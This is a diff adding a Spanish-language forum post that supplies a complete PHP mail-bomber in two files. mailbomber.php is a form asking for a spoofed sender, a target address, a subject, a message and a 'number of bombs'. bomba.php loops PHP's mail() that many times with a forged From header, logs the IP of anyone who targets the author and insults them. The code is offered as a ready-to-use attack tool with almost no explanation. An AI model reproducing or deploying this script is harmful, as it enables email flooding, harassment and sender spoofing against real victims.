@@ -1,0 +1,70 @@
+Consta de dos Archivos, mailbomber.php y bomba.php ..
+
+mailbomber.php 
+
+[codigo]&lt;form method=&quot;POST&quot; action=&quot;bomba.php&quot;&gt; 
+  &lt;p align=&quot;center&quot; style=&quot;margin-top: 0; margin-bottom: 0&quot;&gt;&lt;b&gt;
+  &lt;font size=&quot;1&quot; face=&quot;Fixedsys&quot;&gt;Correo Falso:&lt;/font&gt;&lt;/b&gt;&lt;/p&gt; 
+  &lt;p style=&quot;margin-top: 0; margin-bottom: 0&quot;&gt;&lt;/p&gt; 
+  &lt;p align=&quot;center&quot; style=&quot;margin-top: 0; margin-bottom: 0&quot;&gt; 
+  &lt;font color=&quot;#FFFFFF&quot; size=&quot;1&quot; face=&quot;Fixedsys&quot;&gt; 
+  &lt;b&gt; 
+  &lt;input type=&quot;text&quot; name=&quot;falso&quot; size=&quot;20&quot; style=&quot;border: 1px solid #FFFFFF; ; background-color:#000000; color:#FFFFFF&quot;&gt;&lt;/b&gt;&lt;/font&gt;&lt;/p&gt; 
+  &lt;p align=&quot;center&quot; style=&quot;margin-top: 0; margin-bottom: 0&quot;&gt;&lt;b&gt;
+  &lt;font size=&quot;1&quot; face=&quot;Fixedsys&quot;&gt;Para:&lt;/font&gt;&lt;/b&gt;&lt;/p&gt; 
+  &lt;p align=&quot;center&quot; style=&quot;margin-top: 0; margin-bottom: 0&quot;&gt; 
+  &lt;font color=&quot;#FFFFFF&quot; size=&quot;1&quot; face=&quot;Fixedsys&quot;&gt; 
+  &lt;b&gt; 
+  &lt;input type=&quot;text&quot; name=&quot;para&quot; size=&quot;20&quot; style=&quot;border: 1px solid #FFFFFF; ; background-color:#000000; color:#FFFFFF&quot;&gt;&lt;/b&gt;&lt;/font&gt;&lt;/p&gt; 
+  &lt;p align=&quot;center&quot; style=&quot;margin-top: 0; margin-bottom: 0&quot;&gt;&lt;b&gt;
+  &lt;font size=&quot;1&quot; face=&quot;Fixedsys&quot;&gt;Asunto:&lt;/font&gt;&lt;/b&gt;&lt;/p&gt; 
+  &lt;p align=&quot;center&quot; style=&quot;margin-top: 0; margin-bottom: 0&quot;&gt; 
+  &lt;font color=&quot;#FFFFFF&quot; size=&quot;1&quot; face=&quot;Fixedsys&quot;&gt; 
+  &lt;b&gt; 
+  &lt;input type=&quot;text&quot; name=&quot;asunto&quot; size=&quot;20&quot; style=&quot;border: 1px solid #FFFFFF; ; background-color:#000000; color:#FFFFFF&quot;&gt;&lt;/b&gt;&lt;/font&gt;&lt;/p&gt; 
+  &lt;p align=&quot;center&quot; style=&quot;margin-top: 0; margin-bottom: 0&quot;&gt; 
+  &lt;b&gt;&lt;font size=&quot;1&quot; face=&quot;Fixedsys&quot;&gt;Numero de bombas:&lt;/font&gt;&lt;/b&gt;&lt;/p&gt; 
+  &lt;p align=&quot;center&quot; style=&quot;margin-top: 0; margin-bottom: 0&quot;&gt; 
+  &lt;font color=&quot;#FFFFFF&quot; size=&quot;1&quot; face=&quot;Fixedsys&quot;&gt; 
+  &lt;b&gt; 
+  &lt;input type=&quot;text&quot; name=&quot;bombas&quot; size=&quot;20&quot; style=&quot;border: 1px solid #FFFFFF; ; background-color:#000000; color:#FFFFFF&quot;&gt;&lt;/b&gt;&lt;/font&gt;&lt;/p&gt; 
+  &lt;p align=&quot;center&quot; style=&quot;margin-top: 0; margin-bottom: 0&quot;&gt;&lt;b&gt;
+  &lt;font size=&quot;1&quot; face=&quot;Fixedsys&quot;&gt;Texto:&lt;/font&gt;&lt;/b&gt;&lt;/p&gt; 
+  &lt;p align=&quot;center&quot; style=&quot;margin-top: 0; margin-bottom: 0&quot;&gt; 
+  &lt;textarea rows=&quot;10&quot; name=&quot;texto&quot; cols=&quot;31&quot; style=&quot;border: 1px solid #FFFFFF; ; background-color:#000000; color:#FFFFFF&quot;&gt;&lt;/textarea&gt;&lt;/p&gt; 
+  &lt;p align=&quot;center&quot;&gt;
+  &lt;input type=&quot;submit&quot; value=&quot;Bombardear&quot; name=&quot;enviar&quot; style=&quot;border: 3px double #FFFFFF; padding-left: 4; padding-right: 4; padding-top: 1; padding-bottom: 1; background-color: #000000; color:#FFFFFF&quot;&gt;
+  &lt;input type=&quot;reset&quot; value=&quot;Borrar&quot; name=&quot;borrar&quot; style=&quot;border: 3px double #FFFFFF; padding-left: 4; padding-right: 4; padding-top: 1; padding-bottom: 1; background-color: #000000; color:#FFFFFF&quot;&gt;&lt;/p&gt; 
+  &lt;p align=&quot;center&quot;&gt;&lt;span lang=&quot;es&quot;&gt;&lt;/p&gt; 
+&lt;/form&gt;[/codigo]
+
+
+bomba.php
+
+[codigo]&lt;? 
+//Escibimos el e-mail del autor 
+$zhizhox = &quot;zhizho@hotmail.com&quot;; 
+//El que bombardea el mail 
+$de = &quot;From:$falso\r\n&quot;; 
+//Sacamos la ip de el que intenta bombardear el autor para bannearlo 
+$ip = $REMOTE_ADDR; 
+//Funcion que permite que no llegen los mails 
+if($para == $zhizhox) { 
+echo(&quot;Tu IP:  &lt;b&gt;$ip&lt;/b&gt; a sido guardada, has intentando hacer algo no permitido. bombardear al autor .. JAJA PENDEJO !&quot;); 
+//Archivo que mete la ip del looser que intenta bombardear al autor 
+$fp = fopen(&quot;banlist.dat&quot;, &quot;a&quot;); 
+fputs($fp, &quot;$ip\r\n&quot;); 
+fclose($fp); 
+} 
+else { 
+for ($i=0;$i&lt;=$bombas;$i++){ 
+//Funcion mail para los msgs 
+mail(&quot;$para&quot;,&quot;$asunto&quot;,&quot;$texto&quot;,&quot;$de&quot;); 
+} 
+echo(&quot;&lt;b&gt;$para&lt;/b&gt; ha sido bombardeado&lt;p&gt;&quot;); 
+echo(&quot;&lt;/p&gt;&lt;b&gt;&lt;a href='javascript:history.go(-1)'&gt;Regresar&lt;/a&gt;&quot;); } 
+?&gt;[/codigo]
+
+Bueno, eso es todo el script, creo ke no necesita mucha explicacion..
+
+[url]Http://sinnombre-mx.org[/url]
